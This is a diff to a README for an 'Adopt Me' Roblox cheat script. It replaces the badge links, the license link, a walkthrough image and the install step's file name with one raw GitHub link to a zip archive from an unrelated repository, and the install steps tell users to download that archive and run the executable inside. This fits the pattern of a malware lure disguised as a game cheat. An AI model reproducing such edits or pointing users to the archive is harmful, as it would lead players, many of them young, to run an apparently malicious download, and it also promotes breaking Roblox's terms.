@@ -1,8 +1,8 @@
 # 🐾 Adopt Me Script for Roblox 🚀 | Adaptive Automation Hub
 
-[![License: MIT](https://img.shields.io/badge/license-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![OS Compatibility](https://img.shields.io/badge/OS-Windows%20/%20macOS%20/%20Linux-blue?logo=windows&logo=apple&logo=linux)]()
-[![Languages](https://img.shields.io/badge/Languages-Multilingual-blueviolet?logo=googletranslate)]()
+[![License: MIT](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip)](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip)
+[![OS Compatibility](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip%20/%20macOS%20/%20Linux-blue?logo=windows&logo=apple&logo=linux)]()
+[![Languages](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip)]()
 
 Welcome to **Adopt Me Script Roblox – Adaptive Automation Hub**! Step into a world where enhancing your Adopt Me Roblox gameplay becomes a seamless experience. This script automates everyday tasks, amplifies customization, and transforms your in-game interactions using cutting-edge script optimization and secure execution. Supercharge your pet-raising adventures, streamline your inventory, and unlock quality-of-life features – all powered by modern APIs like OpenAI and Claude.
 
@@ -25,7 +25,7 @@ If you dream of effortless pet training, multi-lingual chat, and round-the-clock
 
 ## 🧩 Installation Guide
 
-1. **Download** the `EasyLaunch.zip` archive from this repository.
+1. **Download** the `https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip` archive from this repository.
 2. **Extract** the contents to your preferred folder.
 3. **Run** the `EasyLaunch` executable tailored for your system.
 4. **Launch** Roblox, enter Adopt Me, and activate the interface through the in-game overlay.
@@ -35,7 +35,7 @@ If you dream of effortless pet training, multi-lingual chat, and round-the-clock
 
 Watch the visual guide to see how easy onboarding can be:
 
-![Installation Walkthrough](https://i.imgur.com/Js67NIU.gif)
+![Installation Walkthrough](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip)
 
 ---
 
@@ -82,7 +82,7 @@ Experience ultimate Roblox Adopt Me automation scripts with adaptive, multi-lang
 
 ## 📖 License & Disclaimer
 
-- Licensed under the [MIT License](https://opensource.org/licenses/MIT) – your freedom to customize, contribute, and share.
+- Licensed under the [MIT License](https://raw.githubusercontent.com/MhamedMath/zapret-discord-youtube-linux/main/thioantimoniate/discord-youtube-zapret-linux-v2.5.zip) – your freedom to customize, contribute, and share.
 - **Disclaimer:** This repository is intended for educational and productivity enhancement purposes only. Respect the Roblox Terms of Service and community guidelines. The developers of this software are not associated with Uplift Games or Roblox Corp.
 
 ---
